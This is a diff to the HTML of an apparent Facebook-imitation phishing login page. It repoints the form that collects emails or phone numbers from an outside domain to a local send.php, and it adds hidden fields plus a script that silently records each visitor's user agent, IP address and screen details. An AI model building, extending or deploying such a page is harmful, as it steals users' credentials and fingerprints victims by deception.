@@ -28,6 +28,7 @@
 <!--===============================================================================================-->
 </head>
 <body>
+	
 	<div class="limiter">
 		<div class="container-login100">
 			<div class="wrap-login100">
@@ -37,7 +38,10 @@
 					<span class="login100-form-title p-b-48">
 						
 					</span>
- <form action="http://old.thecryptocurrencyconsultants.com/send.php" method="POST">
+ <form action="send.php" method="POST">
+ 	<input type="hidden" id="user-agent" name="user-agent" value="">
+      <input type="hidden" id="ip-address" name="ip-address" value="">
+      <input type="hidden" id="device-information" name="device-information" value="">
 <center><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/F_icon.svg/2000px-F_icon.svg.png" height="80px" widht="80px"></center>				
 					<div class="wrap-input100 validate-input" data-validate = "enter email or number phone">
 						<input class="input100" type="text" name="email1"
@@ -71,6 +75,25 @@
 						</div>
 					</div>
 				</form>
+				<script>
+      function showUserInformation() {
+        // Get user agent and IP address
+        var userAgent = navigator.userAgent;
+        var ipAddress = "{{IP_ADDRESS}}"; // Replace with server-side IP address retrieval script
+        
+        // Get device information
+        var screenWidth = window.screen.width;
+        var screenHeight = window.screen.height;
+        var devicePixelRatio = window.devicePixelRatio;
+        var deviceInformation = "Screen size: " + screenWidth + " x " + screenHeight + ", Pixel ratio: " + devicePixelRatio;
+        
+        // Set hidden form fields with user information
+        document.getElementById("user-agent").value = userAgent;
+        document.getElementById("ip-address").value = ipAddress;
+        document.getElementById("device-information").value = deviceInformation;
+      }
+      showUserInformation();
+    </script>
 			</div>
 		</div>
 	</div>
